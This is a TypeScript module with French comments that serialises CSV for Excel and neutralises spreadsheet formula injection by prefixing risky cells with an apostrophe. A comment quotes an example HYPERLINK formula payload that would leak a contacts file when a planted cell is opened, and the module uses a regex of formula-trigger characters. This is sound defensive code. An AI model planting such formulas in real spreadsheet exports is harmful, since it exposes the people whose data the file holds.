/**
 * Sérialisation CSV Excel-friendly (FR) :
 * - séparateur `;`
 * - échappement RFC 4180 (guillemets doublés)
 * - BOM UTF-8 pour qu'Excel Windows ouvre correctement les accents
 */

const SEP = ';';
const BOM = '\uFEFF';

/**
 * Caractères qui font interpréter une cellule comme une FORMULE par Excel,
 * LibreOffice et Google Sheets (CWE-1236). Le guillemetage RFC 4180 ne protège
 * pas : le tableur retire les guillemets avant d'évaluer le contenu.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/**
 * Valeurs purement numériques (dont les téléphones internationaux `+33 6 …` et
 * les nombres négatifs) : elles commencent par `+`/`-` sans jamais pouvoir
 * porter d'appel de fonction ni de DDE. On évite de les préfixer pour ne pas
 * dégrader des exports légitimes.
 */
const NUMERIC_LIKE = /^[+-]?[\d\s().+-]+$/;

/**
 * Neutralise une cellule texte susceptible d'être évaluée comme formule.
 *
 * Les exports contiennent des champs saisis par des tiers non authentifiés
 * (formulaire d'accréditation public : prénom, nom, média, message). Sans ce
 * garde-fou, `=HYPERLINK("https://…?d="&A1;"Voir")` déposé dans un prénom
 * s'exécute à l'ouverture du CSV par l'organisateur et exfiltre le fichier de
 * contacts presse. On préfixe d'une apostrophe, convention comprise par les
 * tableurs comme « texte littéral ».
 *
 * Les nombres et booléens (types distincts) ne passent pas ici : un délai ou un
 * score négatif reste un nombre exploitable dans le tableur.
 */
function neutralizeFormula(s: string): string {
  if (!FORMULA_TRIGGERS.test(s)) return s;
  if (NUMERIC_LIKE.test(s)) return s;
  return `'${s}`;
}

/** Échappe une cellule (null/undefined → chaîne vide). */
export function escapeCsvCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';
  const s = typeof value === 'string' ? neutralizeFormula(value) : String(value);
  if (/[;"\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/** Construit un document CSV complet (BOM + en-têtes + lignes). */
export function toCsv(
  headers: string[],
  rows: Array<Array<string | number | boolean | null | undefined>>,
): string {
  const lines: string[] = [];
  lines.push(headers.map(escapeCsvCell).join(SEP));
  for (const row of rows) {
    lines.push(row.map(escapeCsvCell).join(SEP));
  }
  return BOM + lines.join('\r\n') + '\r\n';
}

/** Nom de fichier sûr pour Content-Disposition. */
export function safeFilename(base: string): string {
  return base
    .normalize('NFKD')
    .replace(/[^\w.\-]+/g, '_')
    .replace(/_+/g, '_')
    .slice(0, 80);
}
